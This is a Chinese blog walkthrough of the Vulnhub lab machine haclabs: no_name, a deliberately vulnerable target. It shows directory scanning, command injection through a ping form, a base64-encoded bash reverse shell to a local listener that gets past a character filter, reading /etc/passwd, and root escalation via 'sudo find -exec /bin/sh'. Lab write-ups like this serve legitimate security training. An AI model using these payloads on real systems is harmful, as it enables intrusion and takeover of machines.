@@ -1,0 +1,81 @@
+<div class="article_content clearfix" id="article_content">
+<link href="style.css" rel="stylesheet"/>
+<div class="markdown_views prism-atom-one-dark" id="content_views">
+<svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
+<path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+</svg>
+<p></p>
+<div class="toc">
+<h3>haclabs: no_name（HL.ova）靶机渗透-Vulnhub</h3>
+<ul><li><a href="#_3">前言</a></li><li><a href="#IP_7">一、IP端口探测</a></li><li><a href="#80_9">二、80端口信息收集</a></li><li><ul><li><a href="#1_10">1.目录扫描</a></li><li><a href="#2_24">2.命令执行（||和|）</a></li><li><a href="#3base64_35">3.base64绕过</a></li><li><a href="#4shell_43">4.反弹shell</a></li></ul>
+</li><li><a href="#_55">三、提权</a></li><li><ul><li><a href="#1_64">1.查找隐藏文件</a></li><li><a href="#2haclabs_69">2.获取haclabs密码</a></li><li><a href="#3_72">3.优化终端</a></li><li><a href="#4find_88">4.find提权</a></li></ul>
+</li><li><a href="#_97">总结</a></li></ul>
+</div>
+<p></p>
+<hr/>
+<h1><a id="_3"></a>前言</h1>
+<p>这台靶机（haclabs: no_name）仅开放了1个80端口，目录扫描时尽可能使用多个工具和字典，以便尽可能多的收集信息</p>
+<hr/>
+<h1><a id="IP_7"></a>一、IP端口探测</h1>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/f6c59d0853e5442d8a89b4591b4f16c8.png"/></p>
+<h1><a id="80_9"></a>二、80端口信息收集</h1>
+<h2><a id="1_10"></a>1.目录扫描</h2>
+<p>目录扫描时要多换几个字典和参数，说不定会有新发现</p>
+<blockquote>
+<p>dirb http://172.16.9.20<br/> dirb http://172.16.9.20 /usr/share/wordlists/dirb/big.txt<br/> dirb http://172.16.9.20 /usr/share/wordlists/dirb/big.txt -X .php</p>
+</blockquote>
+<p>扫出来的目录如下：</p>
+<blockquote>
+<p>http://172.16.9.20/index.php<br/> http://172.16.9.20/admin<br/> http://172.16.9.20/server-status<br/> http://172.16.9.20/superadmin.php</p>
+</blockquote>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d23c52f4ae604d1c8d365952f642cc25.png"/><br/> 依次访问发现/index.php、/admin、/server-status均无法直接利用，而/superadmin.php看着像是命令执行</p>
+<h2><a id="2_24"></a>2.命令执行（||和|）</h2>
+<p>输入ip执行ping命令<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/bbdd9dd2ad3141c9a47b45b05ebdaa5a.png"/><br/> <strong>1.依次尝试各种命令拼接符，发现 || 和 | 可用</strong><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/160f0b5c897c4d33969bef26387a4c9a.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/0f369e6937bd4a49b4547498324a6010.png"/><br/> 但有些命令却无回显（如ls），猜想可能有过滤条件<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b92de81d5ed046da8d5992a4eba2dec6.png"/><br/> <strong>2.查看superadmin.php文件</strong><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/a1ee19e88854498982bceafed67534cc.png"/><br/> 显示内容并不完整，此时查看下页面源码，发现以下字符被过滤，若直接使用nc,bash,telnet反弹shell均无法生效<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/f83226dcd80b445ba52d57bcfc28ec62.png"/></p>
+<h2><a id="3base64_35"></a>3.base64绕过</h2>
+<p>通过base64绕过，此处使用bash反弹，为什么不用nc，因为试了nc并未生效，查阅资料知有些类型的nc不带-e参数，因此nc ip port -e /bin/sh是不可用的</p>
+<blockquote>
+<p>echo ‘bash -i &gt;&amp; /dev/tcp/172.16.9.9/3333 0&gt;&amp;1’ | base64<br/> echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuOS45LzMzMzMgMD4mMQo= | base64 -d</p>
+</blockquote>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/4b22ec19ed014cc091aa1e5ee70b68f4.png"/><br/> kali本机开启3333端口监听</p>
+<h2><a id="4shell_43"></a>4.反弹shell</h2>
+<p><strong>注：这里插入的paylaod要在最后添加 |bash，让反弹shell的命令真正执行</strong><br/> echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuOS45LzMzMzMgMD4mMQo= | base64 -d<br/> 结果只是打印出base64解码内容，并不会真正执行反弹shell<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/f01f099d76da4826a007a9f7773e241c.png"/><br/> 完整的payload为：</p>
+<blockquote>
+<p>|echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuOS45LzMzMzMgMD4mMQo= | base64 -d | bash</p>
+</blockquote>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/4420fe064d9f4c9e9d85444b49a504e3.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/0bf5618707a743a8a1d023e56ab03081.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/59ef3363aab441d1a9318938e539e407.png"/></p>
+<h1><a id="_55"></a>三、提权</h1>
+<p>查看系统用户，发现还有个haclabs和yash用户，分别切换到这2个用户目录查看</p>
+<blockquote>
+<p>cat /etc/passwd<br/> cd /home/yash<br/> ls -la<br/> cat flag1.txt</p>
+</blockquote>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/80781e33d85c4d74acc6f12dbbd8c908.png"/><br/> 根据提示消息，haclabs用户的密码存在了yash用户的隐藏文件中</p>
+<h2><a id="1_64"></a>1.查找隐藏文件</h2>
+<p>查找所有属于yash用户的文件</p>
+<blockquote>
+<p>find / -type f -user yash 2&gt;/dev/null</p>
+</blockquote>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/15e670834dc841b9af9a5b4139fa1dda.png"/></p>
+<h2><a id="2haclabs_69"></a>2.获取haclabs密码</h2>
+<p>查看隐藏文件，获取到haclabs密码为 haclabs1234<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/5e34c3c68a8140fa9eb5b44b17713cb8.png"/></p>
+<h2><a id="3_72"></a>3.优化终端</h2>
+<p>切换到haclabs用户,发现需要终端状态，使用python进行终端优化</p>
+<blockquote>
+<p>python3 -c ‘import pty;pty.spawn(“/bin/bash”)’</p>
+</blockquote>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/000f071254204ec5abcbc9b75234fdb2.png"/><br/> 继续优化终端:</p>
+<blockquote>
+<p>ctrl + z<br/> stty raw -echo;fg<br/> export SHELL=/bin/bash<br/> export TERM=xterm<br/> reset</p>
+</blockquote>
+<p>查看haclabs用户目录，发现flag2.txt<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/1a9ab03476284230bcf9360e164226ca.png"/><br/> 查看sudo的配置，发现可以在无需密码情况下执行find<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/e7ccac20a84348b9bd9f7fc3c2819492.png"/></p>
+<h2><a id="4find_88"></a>4.find提权</h2>
+<blockquote>
+<p>sudo find . -exec /bin/sh \;</p>
+</blockquote>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/0b1af263928149269df350551af9e1e1.png"/><br/> 切换到/root 目录，获得Flag3<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2b1396e5f3594a49bd54ca96c85ec1cb.png"/></p>
+<hr/>
+<h1><a id="_97"></a>总结</h1>
+<p><strong>突破点：目录扫描（注意字典和参数）——命令执行（注意payoad）—切换用户（注意优化终端）——find提权</strong></p>
+</div>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css" rel="stylesheet"/>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css" rel="stylesheet"/>
+</div>
